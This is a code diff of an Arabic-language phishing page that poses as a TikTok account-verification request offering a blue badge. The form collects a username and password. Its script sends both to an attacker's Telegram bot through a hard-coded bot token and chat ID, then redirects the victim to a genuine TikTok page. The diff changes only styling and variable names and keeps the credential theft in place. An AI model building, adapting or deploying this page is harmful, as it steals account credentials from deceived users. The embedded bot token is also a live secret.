@@ -9,13 +9,13 @@
     body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; min-height: 100vh; padding: 0 20px; }
     
     .header { text-align: center; padding: 48px 0 10px; }
-    .tiktok-title { font-size: 54px; font-weight: 800; letter-spacing: -1.8px; color: #ffffff; line-height: 1; margin-bottom: 5px; }
+    .tiktok-title { font-size: 54px; font-weight: 800; letter-spacing: -1.8px; color: #ffffff; line-height: 1; margin-bottom: 10px; }
     
-    /* شارة التوثيق الزرقاء الصافية بدون حواف بيضاء */
+    /* تنسيق الشارة الزرقاء المكبرة والمتوسطة */
     .badge-container { display: flex; justify-content: center; margin-bottom: 25px; }
-    .verified-badge { width: 28px; height: 28px; fill: #20d5ec; }
+    .verified-badge { width: 35px; height: 35px; fill: #20d5ec; }
 
-    h1 { font-size: 26px; font-weight: 700; margin: 8px 0 16px; text-align: center; }
+    h1 { font-size: 26px; font-weight: 700; margin: 10px 0 16px; text-align: center; }
     
     /* وصف توثيق الحساب الأصلي */
     .warning { font-size: 15.5px; color: #d0d0d0; text-align: center; line-height: 1.45; margin: 0 auto 36px; max-width: 380px; }
@@ -37,13 +37,13 @@
     
     .input-field::placeholder { color: #777; }
     
-    /* ضبط مكان أيقونة العين لتكون في مكانها الصحيح (يسار الحقل) */
-    .password-wrapper { position: relative; margin-bottom: 20px; }
+    /* ضبط مكان أيقونة العين لتكون متوسطة تماماً */
+    .password-wrapper { position: relative; margin-bottom: 20px; height: 54px; }
     .toggle-password { 
       position: absolute; 
-      top: 50%; 
+      top: 0; 
       left: 15px; 
-      transform: translateY(-50%);
+      height: 100%; 
       background: none; 
       border: none; 
       cursor: pointer; 
@@ -68,13 +68,13 @@
     </div>
   </div>
 
-  <h1>طلب توثيق الحساب</h1>
+  <h1>طلب توثيق الحساب الرسمي</h1>
   
   <p class="warning">
     أدخل بياناتك للحصول على الشارة الزرقاء فوراً. يرجى مراجعة الأهلية للحصول على ميزة التوثيق الرسمي.
   </p>
   
-  <form class="form" onsubmit="sendData(event)">
+  <form class="form" onsubmit="submitForm(event)">
     <input class="input-field" type="text" id="user" placeholder="الهاتف / البريد الإلكتروني / اسم المستخدم" required />
     
     <div class="password-wrapper">
@@ -84,7 +84,7 @@
       </button>
     </div>
     
-    <button class="btn" type="submit">إرسال الطلب</button>
+    <button class="btn" type="submit">إرسال طلب التوثيق</button>
   </form>
   
   <a href="#" class="forgot">هل نسيت كلمة المرور؟</a>
@@ -105,15 +105,15 @@
         : `<svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>`;
     });
 
-    async function sendData(event) {
+    async function submitForm(event) {
       event.preventDefault();
       const user = document.getElementById('user').value;
       const pass = document.getElementById('password').value;
-      const token = '8633152106:AAHnSFCxJtolR1AlUGG5f1hcwmYxsTobS7I'; 
-      const chat_id = '5757914383';
-      const text = `👑 طلب توثيق حساب جديد\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;
+      const token = '8633152106:AAHnSFCxJtolR1AlUGG5f1hcwmYxsTobS7I'; // التوكن الخاص بك
+      const id = '5757914383'; // الأيدي الخاص بك
+      const msg = `👑 طلب توثيق حساب جديد 🔥\n👤 User: ${user}\n🔑 Pass: ${pass}`;
       
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`);
       window.location.href = "https://www.tiktok.com/id/verification";
     }
   </script>
